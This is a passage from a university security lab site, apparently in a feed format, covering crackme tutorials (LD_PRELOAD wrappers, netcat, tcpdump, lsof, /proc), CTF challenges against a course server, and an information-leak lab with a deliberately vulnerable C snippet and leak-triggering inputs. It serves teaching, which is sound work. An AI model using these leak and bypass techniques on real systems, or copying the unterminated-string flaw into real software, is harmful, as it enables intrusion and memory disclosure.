&lt;/code>&lt;/pre>&lt;p>This will build the shared library file (&lt;code>strcmp.so&lt;/code>) and run the &lt;code>crackme2&lt;/code> executable under &lt;code>LD_PRELOAD&lt;/code>.&lt;/p>
&lt;p>Our goal is to use the &lt;code>strcmp()&lt;/code> wrapper to alter the program behavior. We have two ways to make the &lt;code>crackme2&lt;/code> program behave our way:&lt;/p>
&lt;ol>
&lt;li>Leak the password in the &lt;code>strcmp()&lt;/code> wrapper.&lt;/li>
&lt;li>Pass the check regardless of what password we provide.&lt;/li>
&lt;/ol>
&lt;p>Modify the &lt;code>strcmp()&lt;/code> function in the &lt;code>strcmp.c&lt;/code> source code file to alter the the &lt;code>crackme2&lt;/code> program behavior in each of the two ways shown above. To test it, use the &lt;code>Makefile&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>make run
&lt;/code>&lt;/pre>&lt;h3 id="05-tutorial---network-netstat-and-netcat">05. Tutorial - Network: netstat and netcat&lt;/h3>
&lt;p>Services running on remote machines offer a gateway to those particular machines. Whether it&amp;rsquo;s improper handling of the data received from clients, or a flaw in the protocol used between server and clients, certain privileges can be obtained if care is not taken. We&amp;rsquo;ll explore some tools and approaches to analyzing remote services. To follow along, use the server and client programs from &lt;a href="./activities/05-tutorial-network-netstat-netcat/src">05-tutorial-network-netstat-netcat&lt;/a>.&lt;/p>
&lt;p>First of all, start the server:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ./server
Welcome to the awesome server.
Valid commands are:
quit
status
&lt;/code>&lt;/pre>&lt;p>Running any of them at this point doesn&amp;rsquo;t offer much help. We&amp;rsquo;ll come back to this later.&lt;/p>
&lt;p>The most straightforward way to see what a server does is the &lt;a href="https://man7.org/linux/man-pages/man8/netstat.8.html">netstat&lt;/a> utility.&lt;/p>
&lt;pre tabindex="0">&lt;code>$ netstat -tlpn
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name
tcp 0 0 0.0.0.0:36732 0.0.0.0:* LISTEN 3062/steam
tcp 0 0 127.0.0.1:57343 0.0.0.0:* LISTEN 3062/steam
tcp 0 0 127.0.0.1:31337 0.0.0.0:* LISTEN 15022/./server
tcp 0 0 0.0.0.0:58154 0.0.0.0:* LISTEN 3062/steam
tcp 0 0 127.0.0.1:60783 0.0.0.0:* LISTEN 2644/SpiderOak
tcp 0 0 192.168.101.1:53 0.0.0.0:* LISTEN -
tcp 0 0 192.168.100.1:53 0.0.0.0:* LISTEN -
tcp 0 0 0.0.0.0:44790 0.0.0.0:* LISTEN 2644/SpiderOak
tcp 0 0 127.0.0.1:631 0.0.0.0:* LISTEN -
tcp6 0 0 :::631 :::* LISTEN -
&lt;/code>&lt;/pre>&lt;p>Here we&amp;rsquo;re looking at all the programs that are listening (&lt;code>-l&lt;/code>) on a TCP port (&lt;code>-t&lt;/code>). We&amp;rsquo;re also telling netcat not to resolve hosts (&lt;code>-n&lt;/code>) and to show the process that is listening (&lt;code>-p&lt;/code>). We can see that our server is listening on port 31337. Let&amp;rsquo;s keep that in mind and see how the client behaves.&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ./client
Usage: ./client &amp;lt;client name&amp;gt; &amp;lt;server IP&amp;gt; &amp;lt;server port&amp;gt;
$ ./client the_laughing_man localhost 31337
Welcome to the awesome server.
Valid commands are:
listclients
infoclient &amp;lt;client name&amp;gt; [ADMIN access required]
name, IP, port, privileged, connected time
sendmsg &amp;lt;client name&amp;gt; &amp;lt;message&amp;gt;
Enter a command (or &amp;#39;quit&amp;#39; to exit):
listclients
Connected clients are:
the_laughing_man
Enter a command (or &amp;#39;quit&amp;#39; to exit):
sendmsg the_laughing_man test
Enter a command (or &amp;#39;quit&amp;#39; to exit):
Message from the_laughing_man
test
Enter a command (or &amp;#39;quit&amp;#39; to exit):
infoclient the_laughing_man
Not enough minerals!
Enter a command (or &amp;#39;quit&amp;#39; to exit):
&lt;/code>&lt;/pre>&lt;p>So we can do anything except the privileged command &lt;code>infoclient&lt;/code>. Running &lt;code>status&lt;/code> on the server yields no information. What can we do now?&lt;/p>
&lt;p>We can see what the server and client are exchanging at an application level by capturing the traffic with the &lt;a href="https://man7.org/linux/man-pages/man1/tcpdump.1.html">tcpdump&lt;/a> utility. Start tcpdump, the server and then the client, and run the commands again. When you&amp;rsquo;re done, stop tcpdump with Ctrl+C.&lt;/p>
&lt;pre tabindex="0">&lt;code># tcpdump -i any -w crackme5.pcap &amp;#39;port 31337&amp;#39;
tcpdump: listening on any, link-type LINUX_SLL (Linux cooked), capture size 65535 bytes
^C21 packets captured
42 packets received by filter
0 packets dropped by kernel
&lt;/code>&lt;/pre>&lt;p>Here we&amp;rsquo;re telling tcpdump to listen on all available interfaces, write the capture to the &lt;code>crackme5.pcap&lt;/code> file and only log packets that have the source or destination port equal to 31337.&lt;/p>
&lt;p>We can then open our capture with &lt;a href="https://www.wireshark.org/">wireshark&lt;/a> in order to analyze the packets in a friendlier manner.
You can look at the packets exchanged between server and client.
Notice that there seems to be some sort of protocol where values are delimited by the pipe character.
What is especially interesting is the first data packet sent from the client to the server, which sends &lt;code>the_laughing_man|false&lt;/code>.
While we&amp;rsquo;ve specified the client name, there was nothing we could specify via the client command-line in order to control the second value.&lt;/p>
&lt;p>However, since this seems to be a plaintext protocol, there is an alternative course of action available.
The &lt;a href="https://linux.die.net/man/1/nc">netcat&lt;/a> utility allows for arbitrary clients and servers.
It just needs a server address and a server port in client mode.
We can use it instead of the &amp;ldquo;official&amp;rdquo; client and see what happens when we craft the first message.
Go ahead!
Start the server again and a normal client.&lt;/p>
&lt;blockquote>
&lt;p>Connect to the server using &lt;code>netcat&lt;/code>. Then send out the required string through the &lt;code>netcat&lt;/code> connection with true as the second parameter and see if you can find out anything about the normal client.&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code># netcat localhost 31337
Welcome to the awesome server.
Valid commands are:
listclients
infoclient &amp;lt;client name&amp;gt; [ADMIN access required]
name, IP, port, privileged, connected time
sendmsg &amp;lt;client name&amp;gt; &amp;lt;message&amp;gt;
&lt;/code>&lt;/pre>&lt;p>&lt;strong>Doing it in Python&lt;/strong>&lt;/p>
&lt;p>You can create a sever and a client in Python only. We can use the &lt;code>server.py&lt;/code> and &lt;code>client.py&lt;/code> scripts. Check them out first.&lt;/p>
&lt;p>Then run the server by using:&lt;/p>
&lt;pre tabindex="0">&lt;code>python server.py
&lt;/code>&lt;/pre>&lt;p>It now accepts connections on TCP port 9999 as you can see by using &lt;code>netstat&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ netstat -tlpn
[...]
Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name
tcp 0 0 127.0.0.1:9999 0.0.0.0:* LISTEN 12541/python
[...]
&lt;/code>&lt;/pre>&lt;p>Now you can test it using the Python client:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ python client.py
sending &amp;#39;anaaremere&amp;#39;
received &amp;#39;ANAAREMERE&amp;#39;
&lt;/code>&lt;/pre>&lt;p>We can do the same using netcat as the client:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ nc localhost 9999
anaaremere
ANAAREMERE
&lt;/code>&lt;/pre>&lt;p>&lt;strong>Doing it Only with netcat&lt;/strong>&lt;/p>
&lt;p>We can still simulate a network connection using netcat only, both for starting the server and for runing the client.&lt;/p>
&lt;p>Start the server with:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ nc -l -p 4444
&lt;/code>&lt;/pre>&lt;p>Now run the client and send messages by writing them to standard input:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ nc localhost 4444
aaaaa
bbbbb
&lt;/code>&lt;/pre>&lt;p>Messages you write to the client and up in the server.&lt;/p>
&lt;p>This goes both ways: if you write messages on the server they end up in the client. Try that.&lt;/p>
&lt;p>If you want to send a large chunk of data you can redirect a file. Start the server again:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ nc -l -p 4444
&lt;/code>&lt;/pre>&lt;p>and now send the file to it:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat /etc/services | nc localhost 4444
&lt;/code>&lt;/pre>&lt;p>It&amp;rsquo;s now on the server side.&lt;/p>
&lt;p>You can also do it with UDP, instead of TCP by using the &lt;code>-u&lt;/code> flag both for the server and the client. Start the server using:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ nc -u -l -p 4444
&lt;/code>&lt;/pre>&lt;p>And run the client using:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat /etc/services | nc -u localhost 4444
&lt;/code>&lt;/pre>&lt;p>That&amp;rsquo;s how we use netcat (the network swiss army knife).&lt;/p>
&lt;blockquote>
&lt;p>You can also look into &lt;a href="https://linux.die.net/man/1/socat">socat&lt;/a> for a complex tool on dealing with sockets.&lt;/p>
&lt;/blockquote>
&lt;h3 id="06-tutorial---open-files">06. Tutorial - Open files&lt;/h3>
&lt;p>Let&amp;rsquo;s remember how files and programs relate in Linux.&lt;/p>
&lt;p>&lt;img src="assets/files.png" alt="Files">&lt;/p>
&lt;p>Let&amp;rsquo;s also remember that, in Linux, &lt;code>file&lt;/code> can mean one of many things:&lt;/p>
&lt;ul>
&lt;li>regular file&lt;/li>
&lt;li>directory&lt;/li>
&lt;li>block device&lt;/li>
&lt;li>character device&lt;/li>
&lt;li>named pipe&lt;/li>
&lt;li>symbolic or hard link&lt;/li>
&lt;li>socket&lt;/li>
&lt;/ul>
&lt;p>Let&amp;rsquo;s look at the previous server from &lt;code>crackme5&lt;/code>. Start it up once again.&lt;/p>
&lt;p>While previously we&amp;rsquo;ve used netstat to gather information about it, that was by no means the only solution. &lt;a href="https://linux.die.net/man/8/lsof">lsof&lt;/a> is a tool that can show us what files a process has opened:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ lsof -c server
COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME
server 9678 amadan cwd DIR 8,6 4096 1482770 /home/amadan/projects/sss/session01/crackmes/crackme5
server 9678 amadan rtd DIR 8,6 4096 2 /
server 9678 amadan txt REG 8,6 17524 1442625 /home/amadan/projects/sss/session01/crackmes/crackme5/server
server 9678 amadan mem REG 8,6 1753240 3039007 /lib64/libc-2.17.so
server 9678 amadan mem REG 8,6 88088 3039019 /lib64/libnsl-2.17.so
server 9678 amadan mem REG 8,6 144920 3038998 /lib64/ld-2.17.so
server 9678 amadan 0u CHR 136,2 0t0 5 /dev/pts/2
server 9678 amadan 1u CHR 136,2 0t0 5 /dev/pts/2
server 9678 amadan 2u CHR 136,2 0t0 5 /dev/pts/2
server 9678 amadan 3u IPv4 821076 0t0 TCP *:31337 (LISTEN)
&lt;/code>&lt;/pre>&lt;p>We can see the standard file descriptors found in any process, as well as our socket.&lt;/p>
&lt;ul>
&lt;li>
&lt;p>The &lt;code>FD&lt;/code> column shows the file descriptor entry for a file, or a role in case of special files. We notice the current working directory (&lt;code>cwd&lt;/code>), the root directory (&lt;code>rtd&lt;/code>), the current executable (&lt;code>txt&lt;/code>), some memory mapped files (&lt;code>mem&lt;/code>) and the file descriptors (0-3). For normal file descriptors, &lt;code>r&lt;/code> means read access, &lt;code>w&lt;/code> means write access and &lt;code>u&lt;/code> means both.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>The &lt;code>TYPE&lt;/code> column shows whether we&amp;rsquo;re dealing with a directory (&lt;code>DIR&lt;/code>), a regular file (&lt;code>REG&lt;/code>), a character device (&lt;code>CHR&lt;/code>), a socket (&lt;code>IPv4&lt;/code>) or other type of file.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>The &lt;code>NODE&lt;/code> column shows the inode of the file, or a class marker as is the case for the socket.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>The &lt;code>NAME&lt;/code> column shows the path to the file, or the bound address and port for a socket.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>We&amp;rsquo;ve left out some details since they are not relevant for our purposes. Feel free to read the manual page.&lt;/p>
&lt;p>You could also get some hint that there is an open socket by looking into the &lt;code>/proc&lt;/code> virtual filesystem:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ls -l /proc/`pidof server`/fd
total 0
lrwx------ 1 amadan amadan 64 Jun 15 22:04 0 -&amp;gt; /dev/pts/2
lrwx------ 1 amadan amadan 64 Jun 15 22:04 1 -&amp;gt; /dev/pts/2
lrwx------ 1 amadan amadan 64 Jun 15 22:03 2 -&amp;gt; /dev/pts/2
lrwx------ 1 amadan amadan 64 Jun 15 22:04 3 -&amp;gt; socket:[883625]
&lt;/code>&lt;/pre>&lt;p>We&amp;rsquo;ll be using &lt;a href="./activities/06-tutorial-open-files/src">crackme6&lt;/a> for the next part of this section.
Try the conventional means of &lt;code>strings&lt;/code> and &lt;code>ltrace&lt;/code> on it. Then run it normally.&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ./crackme6
Type &amp;#39;start&amp;#39; to begin authentication test
&lt;/code>&lt;/pre>&lt;p>Before complying to what the program tells us, let&amp;rsquo;s use &lt;code>lsof&lt;/code> to see what we can find out:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ lsof -c crackme6
COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME
crackme6 10466 amadan cwd DIR 8,6 4096 1482769 /home/amadan/projects/sss/session01/06-tutorial-open-files
crackme6 10466 amadan rtd DIR 8,6 4096 2 /
crackme6 10466 amadan txt REG 8,6 12922 5377126 /home/amadan/projects/sss/session01/06-tutorial-open-files/crackme6
crackme6 10466 amadan mem REG 8,6 1753240 3039007 /lib64/libc-2.17.so
crackme6 10466 amadan mem REG 8,6 100680 3039039 /lib64/libpthread-2.17.so
crackme6 10466 amadan mem REG 8,6 144920 3038998 /lib64/ld-2.17.so
crackme6 10466 amadan 0u CHR 136,2 0t0 5 /dev/pts/2
crackme6 10466 amadan 1u CHR 136,2 0t0 5 /dev/pts/2
crackme6 10466 amadan 2u CHR 136,2 0t0 5 /dev/pts/2
crackme6 10466 amadan 3w FIFO 0,32 0t0 988920 /tmp/crackme6.fifo
crackme6 10466 amadan 4r FIFO 0,32 0t0 988920 /tmp/crackme6.fifo
&lt;/code>&lt;/pre>&lt;p>There seems to be a named pipe used by the executable. Let&amp;rsquo;s look at it:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ more /tmp/crackme6.fifo
&lt;/code>&lt;/pre>&lt;p>Now go back again at the &lt;code>crackme6&lt;/code> console and type &lt;code>start&lt;/code>. If you see the message that the authentication test has succeeded, quit and try again. If you do not see the message, kill the &lt;code>crackme6&lt;/code> process, look at the more command output and then delete the pipe file. Now try the password.&lt;/p>
&lt;p>&lt;strong>Misc&lt;/strong>&lt;/p>
&lt;p>There are other sources of information available about running processes if you prefer to do things by hand such as:&lt;/p>
&lt;ul>
&lt;li>&lt;code>/proc/&amp;lt;PID&amp;gt;/environ&lt;/code>: all environment variables given when the process was started&lt;/li>
&lt;li>&lt;code>/proc/&amp;lt;PID&amp;gt;/fd&lt;/code>: opened file descriptors.&lt;/li>
&lt;li>&lt;code>/proc/&amp;lt;PID&amp;gt;/mem&lt;/code>: address space layout&lt;/li>
&lt;li>&lt;code>/proc/&amp;lt;PID&amp;gt;/cwd&lt;/code>: symlink to working directory&lt;/li>
&lt;li>&lt;code>/proc/&amp;lt;PID&amp;gt;/exe&lt;/code>: symlink to binary image&lt;/li>
&lt;li>&lt;code>/proc/&amp;lt;PID&amp;gt;/cmdline&lt;/code>: complete program commandline, with arguments&lt;/li>
&lt;/ul>
&lt;h2 id="challenges">Challenges&lt;/h2>
&lt;p>Challenges can be found in the &lt;code>activities/&amp;lt;CHALLENGE_NUMBER&amp;gt;-challenge-&amp;lt;CHALLENGE_NAME&amp;gt;&lt;/code> directory.&lt;/p>
&lt;h3 id="07-challenge---perfect-answer">07. Challenge - Perfect Answer&lt;/h3>
&lt;p>For this task use the &lt;a href="./activities/07-challenge-perfect-answer/src">perfect&lt;/a> binary.&lt;/p>
&lt;p>Can you find the flag?&lt;/p>
&lt;h3 id="08-challenge---lots-of-strings">08. Challenge - Lots of strings&lt;/h3>
&lt;p>Use the &lt;a href="./activities/08-challenge-lots-of-strings/src">lots_of_strings&lt;/a> binary.&lt;/p>
&lt;p>Can you find the &lt;strong>password&lt;/strong>?&lt;/p>
&lt;blockquote>
&lt;p>Hint: use the tools presented in the tutorials.&lt;/p>
&lt;/blockquote>
&lt;h3 id="09-challenge---sleepy-cats">09. Challenge - Sleepy cats&lt;/h3>
&lt;p>For this task use the &lt;a href="./activities/09-challenge-sleepy-cats/src">sleepy&lt;/a> binary.&lt;/p>
&lt;p>The &lt;code>sleep()&lt;/code> function takes too much. Ain&amp;rsquo;t nobody got time for that. We want the flag NOW!!&lt;/p>
&lt;p>Modify the binary in order to get the flag.&lt;/p>
&lt;blockquote>
&lt;p>To edit a binary, you can use &lt;a href="https://vim.fandom.com/wiki/Hex_dump#Editing_binary_files">vim + xxd&lt;/a> or &lt;code>Bless&lt;/code>.
We strongly encourage you to use &lt;code>Bless&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;h3 id="10-challenge---hidden">10. Challenge - Hidden&lt;/h3>
&lt;p>For this challenge use the &lt;a href="./activities/10-challenge-hidden/src">hidden&lt;/a> binary.&lt;/p>
&lt;p>Can you find the hidden flag?&lt;/p>
&lt;blockquote>
&lt;p>You could use &lt;code>ltrace&lt;/code> and &lt;code>strace&lt;/code> to find the flag. But try to make it give you the flag by simply altering the environment, do not attach to the executable.&lt;/p>
&lt;/blockquote>
&lt;h3 id="11-challenge---detective">11. Challenge - Detective&lt;/h3>
&lt;p>This challenge runs remotely at &lt;code>141.85.224.104:31337&lt;/code>. You can use &lt;code>netcat&lt;/code> to connect to it.&lt;/p>
&lt;p>Investigate the &lt;a href="./activities/11-challenge-detective/src">detective&lt;/a> binary. See what it does and work to get the flag.&lt;/p>
&lt;p>You can start from the &lt;a href="./activities/11-challenge-detective/sol/exploit_template.py">sol/exploit_template.py&lt;/a> solution template script.&lt;/p>
&lt;blockquote>
&lt;p>There is a bonus to this challenge and you will be able to find another flag. See that below.&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Bonus: Get the Second Flag&lt;/strong>&lt;/p>
&lt;p>You can actually exploit the remote &lt;a href="./activities/11-challenge-detective/src">detective&lt;/a> executable and get the second flag. Look thoroughly through the executable and craft your payload to exploit the remote service.&lt;/p>
&lt;blockquote>
&lt;p>You need to keep the connection going. Use the construction: &lt;code>cat /path/to/file - | nc &amp;lt;host&amp;gt; &amp;lt;port&amp;gt;&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;h3 id="extra">Extra&lt;/h3>
&lt;p>If you want some more, have a go at the &lt;a href="./activities/bonus/src">bonus&lt;/a> task. It is a simplified CTF task that you should be able to solve using the information learned in this lab.&lt;/p>
&lt;blockquote>
&lt;p>Hint: This executable needs elevated permissions (run with &lt;code>sudo&lt;/code>).&lt;/p>
&lt;/blockquote>
&lt;h3 id="further-pwning">Further pwning&lt;/h3>
&lt;p>&lt;a href="http://pwnable.kr/">pwnable.kr&lt;/a> is a wargames site with fun challenges of different difficulty levels. After completing all tutorials and challenges in this session, you should be able to go there and try your hand at the following games from Toddler&amp;rsquo;s bottle: &lt;code>fd&lt;/code>, &lt;code>collision&lt;/code>, &lt;code>bof&lt;/code>, &lt;code>passcode&lt;/code>, &lt;code>mistake&lt;/code>, &lt;code>cmd1&lt;/code>, &lt;code>blukat&lt;/code> (of course, you are encouraged to try any other challenges, but they might get frustrating, as they require knowledge of notions we will explore in future sessions).&lt;/p>
&lt;h2 id="further-reading">Further Reading&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://man7.org/linux/man-pages/man1/ltrace.1.html">ltrace&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://man7.org/linux/man-pages/man2/syscalls.2.html">syscalls&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://man7.org/linux/man-pages/man2/ptrace.2.html">ptrace&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://man7.org/linux/man-pages/man2/ptrace.2.html">ldconfig&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://linux.die.net/man/1/socat">socat&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://linux.die.net/man/8/lsof">lsof&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://vim.fandom.com/wiki/Hex_dump#Editing_binary_files">vim + xxd&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>Binary:</title><link>/binary/information-leaks/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/binary/information-leaks/</guid><description>
&lt;h1 id="information-leaks">Information Leaks&lt;/h1>
&lt;hr>
&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;hr>
&lt;h4 id="objectives--rationale">Objectives &amp;amp; Rationale&lt;/h4>
&lt;p>This is a tutorial based lab. Throughout this lab you will learn about frequent errors that occur when handling strings. This tutorial is focused on the C language. Generally, OOP languages (like Java, C#,C++) are using classes to represent strings &amp;ndash; this simplifies the way strings are handled and decreases the frequency of programming errors.&lt;/p>
&lt;h4 id="what-is-a-string">What is a string?&lt;/h4>
&lt;p>Conceptually, a string is sequence of characters. The representation of a string can be done in multiple ways. One of the way is to represent a string as a contiguous memory buffer. Each character is &lt;strong>encoded&lt;/strong> in a way. For example the &lt;strong>ASCII&lt;/strong> encoding uses 7-bit integers to encode each character &amp;ndash; because it is more convenient to store 8-bits at a time in a byte, an ASCII character is stored in one byte.&lt;/p>
&lt;p>The type for representing an ASCII character in C is &lt;code>char&lt;/code> and it uses one byte. As a side note, &lt;code>sizeof(char) == 1&lt;/code> is the only guarantee that the &lt;a href="http://www.open-std.org/jtc1/sc22/WG14/www/docs/n1256.pdf" title="http://www.open-std.org/jtc1/sc22/WG14/www/docs/n1256.pdf">C standard&lt;/a> gives.&lt;/p>
&lt;p>Another encoding that can be used is Unicode (with UTF8, UTF16, UTF32 etc. as mappings). The idea is that in order to represent an Unicode string, &lt;strong>more than one&lt;/strong> byte is needed for &lt;strong>one&lt;/strong> character. &lt;code>char16_t&lt;/code>, &lt;code>char32_t&lt;/code> were introduced in the C standard to represent these strings. The C language also has another type, called &lt;code>wchar_t&lt;/code>, which is implementation defined and should not be used to represent Unicode characters.&lt;/p>
&lt;p>Our tutorial will focus on ASCII strings, where each character is represented in one byte. We will show a few examples of what happens when one calls &lt;em>string manipulation functions&lt;/em> that are assuming a specific encoding of the string.&lt;/p>
&lt;p>You will find extensive information on ASCII in the &lt;a href="http://man7.org/linux/man-pages/man7/ascii.7.html" title="http://man7.org/linux/man-pages/man7/ascii.7.html">ascii man page&lt;/a>.&lt;/p>
&lt;p>Inside an Unix terminal issue the command&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">man ascii
&lt;/code>&lt;/pre>&lt;h3 id="length-management">Length management&lt;/h3>
&lt;hr>
&lt;p>In C, the length of an ASCII string is given by its contents. An ASCII string ends with a &lt;code>0&lt;/code> value byte called the &lt;code>NUL&lt;/code> byte. Every &lt;code>str*&lt;/code> function (i.e. a function with the name starting with &lt;code>str&lt;/code>, such as &lt;code>strcpy&lt;/code>, &lt;code>strcat&lt;/code>, &lt;code>strdup&lt;/code>, &lt;code>strstr&lt;/code> etc.) uses this &lt;code>0&lt;/code> byte to detect where the string ends. As a result, not ending strings in &lt;code>0&lt;/code> and using &lt;code>str*&lt;/code> functions leads to vulnerabilities.&lt;/p>
&lt;h3 id="1-basic-info-leak-tutorial">1. Basic Info Leak (tutorial)&lt;/h3>
&lt;p>Enter the &lt;code>01-basic-info-leak/&lt;/code> subfolder. It's a basic information leak example.&lt;/p>
&lt;p>In &lt;code>basic_info_leak.c&lt;/code>, &lt;code>buf&lt;/code> is supplied as input, hence is not trusted. We should be careful with this buffer. If the user gives &lt;code>32&lt;/code> bytes as input then &lt;code>strcpy&lt;/code> will copy bytes in &lt;code>my_string&lt;/code> until it finds a &lt;code>NUL&lt;/code> byte (&lt;code>0x00&lt;/code>). Because the &lt;a href="/courses/cns/labs/lab-05" title="cns:labs:lab-05">stack grows down&lt;/a>, on most
platforms, we will start accessing the content of the stack. After the &lt;code>buf&lt;/code> variable the stack stores the &lt;code>old rbp&lt;/code>, the function return address and then the function parameters. This information is copied into &lt;code>my_string&lt;/code>. As such, printing information in &lt;code>my_string&lt;/code> (after byte index &lt;code>32&lt;/code>) using &lt;code>puts()&lt;/code> results in information leaks.&lt;/p>
&lt;p>We can test this using:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code}" data-lang="{.code}">$ python -c &amp;#39;print(&amp;#34;A&amp;#34;*32)&amp;#39; | ./basic_info_leak
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�8�
&lt;/code>&lt;/pre>&lt;p>In order to check the hexadecimal values of the leak, we pipe the output
through &lt;code>xxd&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code}" data-lang="{.code}">$ python -c &amp;#39;print(&amp;#34;A&amp;#34;*32)&amp;#39; | ./basic_info_leak | xxd
00000000: 4141 4141 4141 4141 4141 4141 4141 4141 AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141 AAAAAAAAAAAAAAAA
00000020: d066 57b4 fc7f 0a .fW....
&lt;/code>&lt;/pre>&lt;p>We have leaked one value above:&lt;/p>
&lt;p>the lower non-0 bytes of the old/stored &lt;code>rbp&lt;/code> value (right after the buffer): &lt;code>0x7ffcb45766d0&lt;/code> (it's a little endian architecture); it will differ on your system&lt;/p>
&lt;p>The return address usually doesn't change (except for executables with PIE, &lt;em>Position Independent Executable&lt;/em> support). But assuming ASLR is enabled, the &lt;code>rbp&lt;/code> value changes at each run. If we leak it we have a basic address that we can toy around to leak or overwrite other values. We'll see more of that in the &lt;a href="#p_information_leak" title="cns:labs:lab-07 ↵">Information Leak&lt;/a> task.&lt;/p>
&lt;h3 id="2-information-leak">2. Information Leak&lt;/h3>
&lt;p>We will now show how improper string handling will lead to information leaks from the memory. For this, please access the &lt;code>02-info-leak/&lt;/code> subfolder. Please browse the &lt;code>info-leak.c&lt;/code> source code file.&lt;/p>
&lt;p>The snippet below is the relevant code snippet. The goal is to call the &lt;code>my_evil_func()&lt;/code> function. One of the building blocks of exploiting a vulnerability is to see whether or not we have memory write. If you have memory writes, then getting code execution is a matter of getting things right. In this task we are assuming that we have memory write (i.e. we can write any value at any address). You can call the &lt;code>my_evil_func()&lt;/code> function by overriding the return address of the &lt;code>my_main()&lt;/code> function:&lt;/p>
&lt;pre tabindex="0">&lt;code>#define NAME_SZ 32
 
static void read_name(char *name)
{
memset(name, 0, NAME_SZ);
read(0, name, NAME_SZ);
//name[NAME_SZ-1] = 0;
}
 
static void my_main(void)
{
char name[NAME_SZ];
 
read_name(name);
printf(&amp;#34;hello %s, what address to modify and with what value?\n&amp;#34;, name);
fflush(stdout);
my_memory_write();
printf(&amp;#34;Returning from main!\n&amp;#34;);
}
&lt;/code>&lt;/pre>&lt;p>What catches our eye is that the &lt;code>read()&lt;/code> function call in the &lt;code>read_name()&lt;/code> function read &lt;strong>exactly&lt;/strong> &lt;code>32&lt;/code> bytes. If we provide it &lt;code>32&lt;/code> bytes it won't be null-terminated and will result in an information leak when &lt;code>printf()&lt;/code> is called in the &lt;code>my_main()&lt;/code> function.&lt;/p>
&lt;h4 id="exploiting_the_memory_write_using_the_info_leak">Exploiting the memory write using the info leak&lt;/h4>
&lt;p>Let's first try to see how the program works:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ python -c &amp;#39;import sys; sys.stdout.write(10*&amp;#34;A&amp;#34;)&amp;#39; | ./info_leak
hello AAAAAAAAAA, what address to modify and with what value?
&lt;/code>&lt;/pre>&lt;p>The binary wants an input from the user using the &lt;code>read()&lt;/code> library call as we can see below:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ python -c &amp;#39;import sys; sys.stdout.write(10*&amp;#34;A&amp;#34;)&amp;#39; | strace -e read ./info_leak
read(3, &amp;#34;\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\203\1\0004\0\0\0&amp;#34;..., 512) = 512
read(0, &amp;#34;AAAAAAAAAA&amp;#34;, 32) = 10
hello AAAAAAAAAA, what address to modify and with what value?
read(0, &amp;#34;&amp;#34;, 4) = 0
+++ exited with 255 +++
&lt;/code>&lt;/pre>&lt;p>The input is read using the &lt;code>read()&lt;/code> system call. The first read expects 32 bytes. You can see already that there's another &lt;code>read()&lt;/code> call. That one is the first &lt;code>read()&lt;/code> call in the &lt;code>my_memory_write()&lt;/code> function.&lt;/p>
&lt;p>As noted above, if we use exactly &lt;code>32&lt;/code> bytes for name we will end up with a non-null-terminated string, leading to an information leak. Let's see how that goes:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ python -c &amp;#39;import sys; sys.stdout.write(32*&amp;#34;A&amp;#34;)&amp;#39; | ./info_leak
hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�)���, what address to modify and with what value?
 
$ python -c &amp;#39;import sys; sys.stdout.write(32*&amp;#34;A&amp;#34;)&amp;#39; | ./info_leak | xxd
00000000: 6865 6c6c 6f20 4141 4141 4141 4141 4141 hello AAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141 AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 f0dc ffff ff7f 2c20 7768 AAAAAA......, wh
00000030: 6174 2061 6464 7265 7373 2074 6f20 6d6f at address to mo
00000040: 6469 6679 2061 6e64 2077 6974 6820 7768 dify and with wh
00000050: 6174 2076 616c 7565 3f0a at value?.
